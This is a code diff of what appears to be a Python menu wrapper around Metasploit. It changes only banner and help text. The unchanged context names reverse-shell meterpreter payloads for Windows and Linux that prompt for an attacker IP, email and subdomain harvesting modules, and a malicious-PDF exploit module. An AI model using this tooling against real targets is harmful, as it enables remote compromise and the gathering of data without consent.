@@ -185,7 +185,7 @@ print(banner)
 
 def main():
     green()
-    print("Use the help command to see the options!")
+    print("Remember there are updates! use the update command to update")
     red()
     opcion = input("root@"+user+":~# ")
 
@@ -421,7 +421,7 @@ def windows_tcp():
 def windows_http():
     os.chdir( exes )
     os.system("clear")
-    print(banner)
+    print(banner2)
     red()
     print("Using: windows/meterpreter/reverse_http")
     ip = input("Attacker IP: ")
@@ -456,7 +456,7 @@ def windows_http():
 def linux_tcp():
     os.chdir( elfs )
     os.system("clear")
-    print(banner)
+    print(banner2)
     red()
     print("Using: linux/x86/meterpreter/reverse_tcp")
     ip = input("Attacker IP: ")
@@ -491,7 +491,7 @@ def linux_tcp():
 def search_email():
     os.chdir( auxiliary )
     os.system("clear")
-    print(banner)
+    print(banner2)
     red()
     print("Using: auxiliary/gather/search_email_collector")
     domain = input("Give me the domain: ")
@@ -519,7 +519,7 @@ def search_email():
 def search_sdomains():
     os.chdir( auxiliary )
     os.system("clear")
-    print(banner)
+    print(banner2)
     red()
     print("Using: auxiliary/gather/searchengine_subdomains_collector")
     domain = input("Give me the domain: ")
@@ -544,7 +544,7 @@ def search_sdomains():
 def adobe_exe():
     os.chdir( exploit )
     os.system("clear")
-    print(banner)
+    print(banner2)
     red()
     print("Using: exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs")
     filename = input("File name: ")
